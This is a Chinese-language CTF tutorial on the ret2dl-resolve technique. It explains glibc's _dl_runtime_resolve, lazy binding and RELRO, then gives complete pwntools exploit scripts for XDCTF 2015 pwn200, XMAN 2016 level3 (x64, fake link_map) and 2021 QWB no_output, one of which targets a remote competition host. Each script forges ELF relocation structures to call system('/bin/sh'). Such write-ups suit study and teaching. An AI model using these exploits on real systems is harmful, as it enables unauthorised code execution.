@@ -1,0 +1,652 @@
+深入理解-dl_runtime_resolve
+概要
+目前大部分漏洞利用常包含两个阶段：
+
+首先通过信息泄露获取程序内存布局
+第二步才进行实际的漏洞利用
+然而信息泄露的方法并不总是可行的，且获取的内存信息并不可靠，于是就有了ret2dl_resolve的利用方式。这种方式巧妙的利用了ELF文件格式以及动态装载器的弱点，不需要进行信息泄露就可以直接标识关键函数并调用。
+
+符号解析过程以及结构体定义
+解析原理
+动态装载器负责将二进制文件以及依赖库加载到内存，该过程包含了对导入符号的解析。
+
+也就是说，在第一次调用函数时都由_dl_runtime_resolve函数来完成，以下是函数原型：
+
+_dl_runtime_resolve(link_map_obj, reloc_index)
+
+
+resolve函数第二个参数是reloc_index，它可以找到文件中.rel.plt表，.rel.plt表由Elf Rel结构体组成，定义如下：
+
+
+它的r_offset用于保存解析后的符号地址写入内存的位置（绝对地址），r_info的高位3字节用于标识该符号在.dynsym中的下标。
+
+它在程序中的内容如下：
+
+
+Elf Rel结构体中的r_info 成员指向.dynsym段中的Elf Sym结构体。结构体定义如下：
+
+
+Elf Sym结构体中前两个成员为重要成员，st_value 是当符号被导出时用于存放虚拟地址，不导出则为NULL。st_name 是相对于.dynstr段的偏移， .dynstr保存符号名称字符串， 内容如下：
+
+
+总结起来就是：
+当程序导入函数时，动态链接器在.dynstr段中添加一个函数名称字符串
+在.dynsym段中添加一个指向函数名称字符串的Elf Sym结构体
+在.rel.plt段中添加一个指向Elf Sym的Elf Rel结构体
+最后Elf Rel的r_offse构成GOT表，保存在.got.plt段中
+
+Lazy Binding
+Lazy Binding机制（延迟绑定）即只有函数被调用时，才会对函数地址进行解析，然后将真实地址写入GOT表中。第二次调用函数时便不再进行加载
+
+该过程是通过PLT表进行的。每个函数都在PLT表中有一个条目（PLT[0]），第一条指令无条件跳转到对应的GOT条目保存的地址。在程序中类似于下面这样：
+
+
+然后GOT条目在初始化时默认指向PLT条目的第二条指令位置（PLT[1]），相当于又跳回来了。执行下面两条指令：
+
+push xxx ：先将导入函数的标识（Elf Rel在.rel.plt的偏移）压栈
+然后跳转到GOT[2]保存的地址处，也就是_dl_runtime_resolve()函数
+
+在程序中类似于下面这样，并且可以验证0x804A008，也就是GOT[2]是存储的dl_runtime_resolve()函数：
+
+
+
+
+_dl_runtime_resolve函数中第一个参数link_map_obj，用于获取解析导入函数所需的信息，第二个参数reloc_index则标识了解析哪一个导入函数（当前函数setbuf 的reloc_index是0，所以是0）：
+
+
+下面看看另一个函数strlen，reloc_index为0x10，所以为0x10：
+
+
+在_dl_runtime_resovle函数中，_dl_fixup()函数用于解析导入函数的真实地址，并改写GOT：
+
+
+总结起来就是：
+首先无条件跳转到GOT表条目，jmp xxx
+然后把reloc_index压栈，再次跳转到GOT条目**
+然后把link_map_obj压栈，参数压栈完成后，执行_dl_runtime_resolve函数
+_dl_runtime_resolve中的_dl_fixup完成解析并将真实地址写入GOT表
+
+漏洞利用
+程序保护机制RELRO（Relocation Read-Only，重定位只读）是用于缓解由动态解析缺陷而产生的。一般分为三种情况：
+
+gcc -o test test.c                  // 默认情况下, 是Partial RELRO
+gcc -z norelro -o test test.c       // 关闭, 即No RELRO。
+gcc -z lazy -o test test.c          // 部分开启, 即Partial RELRO
+gcc -z now -o test test.c           // 全部开启, 即
+No RELRO
+
+
+完全关闭。.dynamic段可写，动态装载器是以.dynamic段的DT_STRTAB条目来获取.dynstr段的地址，而DT_STRTAB地址是已知的，且默认情况下可写，所以可以改写DT_STRTAB，欺骗动态装载器，使其找到伪造的.dynstr段，将我们控制的地址内的字符串解析为函数名称，然后去解析函数地址。比如修改DT_STRTAB的.dynstr条目内容为bss段，在bss段中写入execve字符串，假如现在正要解析printf函数，那么就会解析成execve函数的地址。
+
+
+Partial RELRO
+
+
+开启部分保护，.dynamic段不可写。之前介绍_dl_runtime_resolve时提到，第二个参数reloc_index对应Elf Rel在.rel.plt中的偏移，动态装载器将reloc_index加上.rel.plt的基址来得到目标Elf Rel的内存地址。
+
+当我们控制reloc_index的值，使它相加后刚好落在bss段上，就可以在bss段上构造一个Elf Rel结构体，使Elf Rel的第一个成员r_offset的值是一个可写的地址，用来保存解析后的函数地址。然后使r_info的值导向到可控制的内存下标，指向Elf Sym，Elf Sym中的st_name 再指向函数名称字符串，那么就可以解析成我们想要的函数地址。
+
+
+FULL RELRO
+
+
+保护完全开启，开启后立即绑定函数地址，添加 PT_GNU_RELRO 段，.got只读不可写，.got.plt 节取消，PLT 直接调用.got节地址。Bypass可参考网上资料。
+
+XDCTF 2015 pwn200
+程序源码
+
+#include <string.h>
+#include<stdio.h>
+
+void vuln()
+{
+    char buf[100];
+    setbuf(stdin, buf);
+    read(0, buf, 256);
+}
+
+int main()
+{
+    char buf[100] = "Welcome to XDCTF2015~!\n";
+    setbuf(stdout, buf);
+    write(1, buf, strlen(buf));
+    vuln();
+    return 0;
+};
+编译为动态链接32位可执行文件，开启Partial RELRO 和NX保护：
+
+gcc -m32 -fno-stack-protector -no-pie pwn200.c -o pwn200
+
+
+可以从源码得知有栈溢出漏洞，可以通过泄露libc地址的方式获取flag，但在这里使用ret2dl-resolve的方式。
+程序开启了Partial RELRO 保护，那么就按照上面介绍的第二种保护情况来做。
+首先利用栈溢出控制执行流，调用read函数将下一阶段的payload读取到bss段上：
+payload1 = b'a' * (0x6c + 4)                       # 填充长度
+payload1 += p32(read_plt)                          # read(0, bss_addr, 100)
+payload1 += p32(pppr)                              # 清栈
+payload1 += p32(0) + p32(bss_addr) + p32(100)
+payload1 += p32(pop_ebp_addr)                      # 构造一个假的ebp
+payload1 += p32(bss_addr)                        
+payload1 += p32(leave_ret_addr)                    # 栈迁移到bss段中
+这里一步一步模拟write函数的解析过程，最终实现system("/bin/sh") 。在bss段构造payload，并且打印出我们填入的字符串，以便验证:
+payload2 = b'aaaa'                               # ebp
+payload2 += p32(write_plt)                       # write(1, bss_addr+80, 7)
+payload2 += b'aaaa'
+payload2 += p32(1) + p32(bss_addr + 80) + p32(len('/bin/sh'))
+payload2 += b'a' * (80 - len(payload2))          # 填充长度为80，以免字符串被后续payload破坏
+payload2 += b'/bin/sh\x00'                       # bss_addr+80 内容为字符串 “/bin/sh\x00”
+payload2 += b'a' * (100 - len(payload2))        
+接下来模拟write@plt的执行效果。在bss段构造payload，将_dl_runtime_resolve函数的参数压栈，也就是reloc_index ，再跳转到PLT[0]，就是第一个无条件跳转指令 jmp xxx：
+reloc_index = 0x20
+
+payload3 = b'aaaa'
+payload3 += p32(plt_0)                      # write 函数的jmp xxx地址
+payload3 += p32(reloc_index)                # push 0x20
+payload3 += b'aaaa'
+payload3 += p32(1) + p32(bss + 80) + p32(len('/bin/sh'))
+payload3 += b'a' * (80 - len(payload3))
+payload3 += b'/bin/sh\x00'
+payload3 += b'a' * (100 - len(payload3))
+然后在bss段中构造一个Elf Rel结构，r_offset 设置成write@got 的地址，表示解析后的真实地址填入这里。r_info直接照搬，设置成0x607，动态加载器会通过这个值找到对应的Elf Sym。那么现在reloc_index就不再是0x20了，应该调整为Elf Rel基地址距离bss段上的偏移：
+
+
+r_info成员的值是0x607，直接照搬到payload中
+
+reloc_index = bss_addr - rel_plt + 28       # 这里需要加上28的偏移，具体可以调试得知
+r_info = 0x607                              # .rel.plt 的 r_info 成员
+fake_reloc = p32(write_got) + p32(r_info)   # 模拟JMPREL Rel表
+
+payload4 = b'aaaa'
+payload4 += p32(plt_0)                      # plt[0]
+payload4 += p32(reloc_index)                # push 
+payload4 += b'aaaa'
+payload4 += p32(1) + p32(bss_addr + 80) + p32(len('/bin/sh'))  # write函数的参数，会打印出“/bin/sh”
+
+payload4 += fake_reloc                      
+
+payload4 += b'a' * (80 - len(payload4))     # 填充长度
+payload4 += b'/bin/sh\x00'
+payload4 += b'a' * (100 - len(payload4))
+在bss段中伪造Elf Sym。首先使用readelf命令，查找到write函数在.dynsym段的下标，得知下标为6，然后使用objdump找到下标为6的那一行，数据直接照搬就可以了：
+
+
+
+
+那么之前构造的fake_reloc也要调整，r_info可以通过r_sym和r_type计算得出。r_sym也就是Elf Sym相对于.dynsym段的下标偏移，r_type则照搬R_386_JUMP_SLOT的值 0x7
+
+reloc_index = bss_addr + 28 - rel_plt
+r_sym = (bss_addr + 40 - dynsym) / 0x10              # 需要补上40字节的偏移，具体可以调试
+r_type = 0x7
+r_info = (int(r_sym) << 8) + (r_type & 0xff)         # write函数这里的结果就是0x607
+
+fake_reloc = p32(write_got) + p32(r_info)
+fake_sym = p32(0x4c) + p32(0) + p32(0) + p32(0x12)   # 上面objdump的结果照搬
+payload5 = b'aaaa'
+payload5 += p32(plt_0)
+payload5 += p32(reloc_index)
+payload5 += b'aaaa'
+payload5 += p32(1) + p32(bss_addr + 80) + p32(len('/bin/sh'))
+payload5 += fake_reloc
+payload5 += b'aaaa'
+payload5 += fake_sym
+payload5 += b'a' * (80 - len(payload5))
+payload5 += b'/bin/sh\x00'
+payload5 += b'a' * (100 - len(payload5))
+最后，在bss段上伪造.dynstr，也就是放上"write"字符串，相应的调整fake_sym的st_name指向伪造的函数名称字符串。st_info 字段的内容被分为高 28 位的 st_bind 符号绑定信息，以及低 4 位的 st_type 符号类型信息，然后可以通过st_blind和st_type来计算st_info ：
+
+
+reloc_index = bss_addr + 28 - rel_plt
+r_sym = (bss_addr + 40 - dynsym) / 0x10
+r_type = 0x7
+r_info = (r_sym << 8) + (r_type & 0xff)                  # 0x607
+fake_reloc = p32(write_got) + p32(r_info)                # Elf Rel
+
+st_name = bss_addr + 56 - dynstr                         # 指向写入的"write"字符串
+st_bind = 0x1                                            # st_info高28位
+st_type = 0x2                                            # st_info低4位
+st_info = (st_bind << 4) + (st_type & 0xf)               # 0x12
+
+fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
+payload6 = b'aaaa'
+payload6 += p32(plt_0)
+payload6 += p32(reloc_index)                             # fake reloc_index,偏移到了bss段
+payload6 += b'aaaa'
+payload6 += p32(1) + p32(bss_addr + 80) + p32(len('/bin/sh')) # write函数参数
+payload6 += fake_reloc                                   # fake Elf Rel
+payload6 += b'aaaa'
+payload6 += fake_sym                                     # fake Elf Sym
+payload6 += b'write\x00'                                 # st_name
+payload6 += b'a' * (80 - len(payload6))
+payload6 += b'/bin/sh\x00'   
+payload6 += b'a' * (100 - len(payload6))
+最后，只要将字符串“write”改成“system”，调整一下参数即可获得shell。
+
+完整exp
+from pwn import *
+
+# context.log_level = 'debug'
+
+elf = ELF('./pwn200')
+# io = remote('127.0.0.1', 10001)
+io = process('./pwn200')
+io.recv()
+
+pppr_addr      = 0x08048619     # pop esi ; pop edi ; pop ebp ; ret
+pop_ebp_addr   = 0x0804861b     # pop ebp ; ret
+leave_ret_addr = 0x08048458 #: leave ; ret
+
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+read_plt  = elf.plt['read']
+
+plt_0    = elf.get_section_by_name('.plt').header.sh_addr        # 0x80483e0
+rel_plt  = elf.get_section_by_name('.rel.plt').header.sh_addr    # 0x8048390
+dynsym   = elf.get_section_by_name('.dynsym').header.sh_addr     # 0x80481cc
+dynstr   = elf.get_section_by_name('.dynstr').header.sh_addr     # 0x804828c
+bss_addr = elf.get_section_by_name('.bss').header.sh_addr        # 0x804a028
+
+base_addr = bss_addr + 0x600   
+
+payload_1  = b"A" * 112
+payload_1 += p32(read_plt)
+payload_1 += p32(pppr_addr)
+payload_1 += p32(0)
+payload_1 += p32(base_addr)
+payload_1 += p32(100)
+payload_1 += p32(pop_ebp_addr)
+payload_1 += p32(base_addr)
+payload_1 += p32(leave_ret_addr)
+io.send(payload_1)
+
+reloc_index = base_addr + 28 - rel_plt
+fake_sym_addr = base_addr + 36
+align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
+fake_sym_addr = fake_sym_addr + align       # 对齐
+
+# fake Elf Rel
+r_sym = (fake_sym_addr - dynsym) / 0x10
+r_type = 0x7
+r_info = (int(r_sym) << 8) + (r_type & 0xff)
+fake_reloc = p32(write_got) + p32(r_info)
+
+# fake Elf Sym
+st_name = fake_sym_addr + 0x10 - dynstr
+st_bind = 0x1
+st_type = 0x2
+st_info = (st_bind << 4) + (st_type & 0xf)
+fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
+
+payload_7 = b"AAAA"
+payload_7 += p32(plt_0)
+payload_7 += p32(reloc_index)
+payload_7 += b"AAAA"
+payload_7 += p32(base_addr + 80)
+payload_7 += b"AAAA"
+payload_7 += b"AAAA"
+payload_7 += fake_reloc
+payload_7 += b"A" * align
+payload_7 += fake_sym
+payload_7 += b"system\x00"
+payload_7 += b"A" * (80 - len(payload_7))
+payload_7 += b"/bin/sh\x00"
+payload_7 += b"A" * (100 - len(payload_7))
+io.sendline(payload_7)
+io.interactive()
+如果觉得手工构造太麻烦，有一个工具 roputils 可以简化此过程，或者可以使用pwntools中自带的 模块来完成，下面是pwntools构造32位程序exp的例子：
+from pwn import *
+
+context.binary = elf = ELF("./pwn200")
+context.arch='i386'
+context.log_level ='debug'
+
+rop = ROP(context.binary)
+
+dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
+rop.read(0,dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+raw_rop = rop.chain()
+io = process("./pwn200")
+io.recvuntil("\n")
+payload = flat({112:raw_rop,256:dlresolve.payload})
+io.sendline(payload)
+io.interactive()
+x64的ret2dl-resolve—XMAN 2016-level3
+检查保护
+
+
+
+64 位程序一般情况下使用寄存器传参，但给 _dl_runtime_resolve 传参时使用栈
+_dl_runtime_resolve 函数的第二个参数 reloc_index 由偏移变为了索引
+64位在这种情况下，如果像32位一样依次伪造reloc_index、symtab、strtab会出错，原因是在_dl_fixup函数执行过程中，访问到了一段未映射的地址处，接下来我们结合 _dl_fixup 完整源码进行分析，源码位于 glibc-2.23/elf/dl-runtime.c ， 在关键位置给出了注释，其他位置可忽略：
+
+_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg) 
+// 第一个参数link_map，也就是got[1]
+{
+    // 获取link_map中存放DT_SYMTAB的地址
+  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
+
+    // 获取link_map中存放DT_STRTAB的地址
+  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
+
+    // reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体
+  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
+
+    // 根据重定位结构体的r_info得到symtab表中对应的结构体
+  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
+ 
+  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
+  lookup_t result;
+  DL_FIXUP_VALUE_TYPE value;
+ 
+// 检查r_info的最低位是不是7
+  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT); 
+
+// 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码
+  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) 
+    {
+      const struct r_found_version *version = NULL;
+
+    // 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码
+      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
+    {
+      /* 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff的过程中，
+			由于我们一般伪造的symtab位于bss段，就导致在64位下reloc->r_info比较大,故程序会发生错误。所以要使程序不发生错误，
+			自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段：
+
+			第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。
+			第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。*/
+      const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
+      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
+      version = &l->l_versions[ndx];
+      if (version->hash == 0)
+        version = NULL;
+    }
+ 
+      int flags = DL_LOOKUP_ADD_DEPENDENCY;
+      if (!RTLD_SINGLE_THREAD_P)
+    {
+      THREAD_GSCOPE_SET_FLAG ();
+      flags |= DL_LOOKUP_GSCOPE_LOCK;
+    }
+ 
+      RTLD_ENABLE_FOREIGN_CALL;
+
+    // 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym->st_name找到符号表字符串，result为libc基地址
+      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
+                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
+ 
+      if (!RTLD_SINGLE_THREAD_P)
+    THREAD_GSCOPE_RESET_FLAG ();
+ 
+      RTLD_FINALIZE_FOREIGN_CALL;
+ 
+      // 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value
+      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
+    }
+  else
+    {
+      // 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l->l_addr + st_value,我们的目的是使**value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value
+      /* We already found the symbol.  The module (and therefore its load
+     address) is also known.  */
+      value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
+      result = l;
+    }
+ 
+  /* And now perhaps the relocation addend.  */
+  value = elf_machine_plt_value (l, reloc, value);
+ 
+  if (sym != NULL
+      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
+    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
+ 
+  /* Finally, fix up the plt itself.  */
+  if (__glibc_unlikely (GLRO(dl_bind_not)))
+    return value;
+  // 最后把value写入相应的GOT表条目中
+  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
+}
+所以接下来我们的任务就是控制 link_map 中的l_addr和 sym中的st_value 。
+
+具体思路为：
+
+伪造 link_map->l_addr 为libc中已解析函数与想要执行的目标函数的偏移值，如 addr_system - addr_xxx
+伪造 sym->st_value 为已经解析过的某个函数的 got 表的位置
+下面是64位下的sym结构体：
+
+
+
+所以sym结构体的大小为24字节，st_value就位于首地址+0x8的位置（ 4 + 1 + 1 + 2）。
+
+如果，我们把一个函数的got表地址-0x8的位置当作sym表首地址，那么它的st_value的值就是这个函数的got表上的值，也就是实际地址，此时它的st_other恰好不为0
+
+再来看link_map的结构
+
+struct link_map {
+    Elf64_Addr l_addr;
+ 
+    char *l_name;
+ 
+    Elf64_Dyn *l_ld;
+ 
+    struct link_map *l_next;
+ 
+    struct link_map *l_prev;
+ 
+    struct link_map *l_real;
+ 
+    Lmid_t l_ns;
+ 
+    struct libname_list *l_libname;
+ 
+    Elf64_Dyn *l_info[76];  //l_info 里面包含的就是动态链接的各个表的信息
+    ...
+ 
+    size_t l_tls_firstbyte_offset;
+ 
+    ptrdiff_t l_tls_offset;
+ 
+    size_t l_tls_modid;
+ 
+    size_t l_tls_dtor_count;
+ 
+    Elf64_Addr l_relro_addr;
+ 
+    size_t l_relro_size;
+ 
+    unsigned long long l_serial;
+ 
+    struct auditstate l_audit[];
+}
+这里的.dynamic节就对应Elf64_Dyn * l_info的内容
+
+
+
+所以如果我们伪造一个link_map表，很容易就可以控制 l_addr ，通过阅读源码，我们知道_dl_fixup主要用了 l_info 的内容 ，也就是上图中JMPREL,STRTAB,SYMTAB的地址。
+
+所以我们需要伪造这个数组里的几个指针
+
+DT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)
+DT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)
+DT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)
+然后伪造三个elf64_dyn即可，dynstr只需要指向一个可读的地方，因为这里我们没有用到
+
+64位下重定位表项与32位有所不同，多了r_addend成员，三个成员各占8字节，总大小为24字节：
+
+
+在这里可以看到，write 函数在符号表中的偏移为 2（也就是r_info的值：0x200000007h>>32）
+
+
+除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数对应上图中第一个，下标为0，那么就push 0：
+
+
+看看另一个，read函数对应的下标为1，那么就push 1：
+
+
+可以发现针对软件重定位的攻击其实都是围绕函数 _dl_fix_up 的两个参数 link_map和 reloc_arg 展开的，再加上相关数据结构的伪造完成攻击。确实感觉这种攻击是格式化的，虽然过程看上去很复杂，但是实际上都有固定的“套路”，只需按照步骤一步一步操作，大多数情况下就可以完成整个攻击。
+
+下面是完整的脚本
+from pwn import *
+context.update(os = 'linux', arch = 'amd64')
+
+p = process('./level3_x64')
+
+universal_gadget1 = 0x4006aa
+universal_gadget2 = 0x400690
+
+main_got = 0x600a68
+pop_rdi_ret = 0x4006b3
+jmp_dl_fixup = 0x4004a6
+pop_rbp_ret = 0x400550
+leave_ret = 0x400618
+read_got = 0x600a60
+new_stack_addr = 0x600ad0
+fake_link_map_addr = 0x600b00
+
+payload = b""
+payload += b'A'*(0x80+0x8)
+payload += p64(universal_gadget1)
+payload += p64(0x0)
+payload += p64(0x1)
+payload += p64(read_got)
+payload += p64(0x500)
+payload += p64(new_stack_addr)
+payload += p64(0x0)
+payload += p64(universal_gadget2)
+payload += b'A'*56
+
+payload += p64(pop_rbp_ret)
+payload += p64(new_stack_addr)
+payload += p64(leave_ret)
+
+p.send(payload)
+
+sleep(0.5)
+
+offset = 0x24c50    # system - __libc_start_main
+
+fake_Elf64_Dyn = b""
+fake_Elf64_Dyn += p64(0)    #d_tag  从link_map中找.rel.plt不需要用到标签， 随意设置
+fake_Elf64_Dyn += p64(fake_link_map_addr + 0x18)  #d_ptr  指向伪造的Elf64_Rela结构体，由于reloc_offset也被控制为0，不需要伪造多个结构体
+
+fake_Elf64_Rela = b""
+fake_Elf64_Rela += p64(fake_link_map_addr - offset)  # r_offset rel_addr = l->addr+reloc_offset，直接指向fake_link_map所在位置令其可读写就行
+fake_Elf64_Rela += p64(7)               # r_info index设置为0，最后一字节必须为7
+fake_Elf64_Rela += p64(0)               # r_addend  随意设置
+
+fake_Elf64_Sym = b""
+fake_Elf64_Sym += p32(0)                # st_name 随意设置
+fake_Elf64_Sym += b'AAAA'                # st_info, st_other, st_shndx st_other非0以避免进入重定位符号的分支
+fake_Elf64_Sym += p64(main_got-8)       # st_value 已解析函数的got表地址-8，-8体现在汇编代码中，原因不明
+fake_Elf64_Sym += p64(0)                # st_size 随意设置
+
+fake_link_map_data = b""
+fake_link_map_data += p64(offset)       # l_addr，伪造为两个函数的地址偏移值
+fake_link_map_data += fake_Elf64_Dyn
+fake_link_map_data += fake_Elf64_Rela
+fake_link_map_data += fake_Elf64_Sym
+fake_link_map_data += b'\x00'*0x20
+fake_link_map_data += p64(fake_link_map_addr)  # DT_STRTAB 设置为一个可读的地址
+fake_link_map_data += p64(fake_link_map_addr + 0x30)  # DT_SYMTAB 指向对应结构体数组的地址
+fake_link_map_data += b"/bin/sh\x00"
+fake_link_map_data += b'\x00'*0x78
+fake_link_map_data += p64(fake_link_map_addr + 0x8) # DT_JMPREL 指向对应数组结构体的地址
+
+payload = b""
+payload += b"AAAAAAAA"
+payload += p64(pop_rdi_ret)
+payload += p64(fake_link_map_addr+0x78) # /bin/sh\x00地址
+payload += p64(jmp_dl_fixup)    # 用jmp跳转到_dl_fixup，link_map和reloc_offset都由我们自己伪造
+payload += p64(fake_link_map_addr)    # 伪造的link_map地址
+payload += p64(0)             # 伪造的reloc_offset
+payload += fake_link_map_data
+
+p.send(payload)
+p.interactive()
+2021强网杯 [强网先锋]no_output
+此题也是考验ret2dl-resolve攻击方式。exp如下：
+
+from pwn import *
+
+# s = process("./test")
+s = remote("39.105.138.97", "1234")
+elf = ELF("./test")
+
+# 调试参数
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+# bss
+bss = elf.bss(0x400)
+# ROPgadget
+leave = 0x08049267  # leave 清栈
+pppr = 0x08049581  # pop esi;pop edi;pop ebp;ret
+p_ebp_r = 0x08049583  # pop ebp;ret
+r = 0x0804900e  # ret
+read = elf.sym['read']
+
+# 初始化表地址
+plt = elf.get_section_by_name('.plt').header.sh_addr  # 带linkmap然后jmp到_dl_runtime_resolve
+rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
+dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
+dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
+
+# 输入buf
+s.send(b'\x00' * 0x30)
+# 输入src
+s.send(b'\x00' * 0x20)
+# 输入soul
+s.sendline(b'-2147483648')
+# 输入egg
+s.sendline(b'-1')
+
+def send1():
+    payload1 = b'a' * 0x48
+    payload1 += p32(bss)
+    payload1 += p32(read)
+    payload1 += p32(pppr)
+    payload1 += p32(0)
+    payload1 += p32(bss)
+    payload1 += p32(0x200)
+    payload1 += p32(p_ebp_r)
+    payload1 += p32(bss)
+    payload1 += p32(leave)
+    payload1 = payload1.ljust(0x100, b'\x00')
+    s.send(payload1)
+
+def send2():
+    # 伪造地址
+    fake_sym = bss + 0x24
+    fake3 = 0x10 - ((fake_sym - dynsym) & 0xf)
+    fake_sym += fake3
+
+    index = int((fake_sym - dynsym) / 0x10)
+    rrr = (index << 8) | 0x7
+    # 计算偏移
+    name = (fake_sym + 0x10) - dynstr
+    offset = (bss + 0x1c) - rel_plt
+    # 重定位
+    rel = p32(elf.got['read']) + p32(rrr)
+
+    binsh = bss + 0x100
+
+    payload2 = p32(0)
+    payload2 += p32(plt)
+    payload2 += p32(offset)
+    payload2 += p32(0)
+    payload2 += p32(binsh)
+    payload2 += p32(0)
+    payload2 += p32(0)
+    payload2 += rel
+    payload2 += b'a' * fake3
+    payload2 += p32(name)
+    payload2 += p32(0)
+    payload2 += p32(0)
+    payload2 += p32(18)
+    payload2 += b'system\x00'
+    payload2 = payload2.ljust(256, b'\x00')
+    payload2 += b'/bin/sh'
+    s.send(payload2)
+
+send1()
+send2()
+s.interactive()
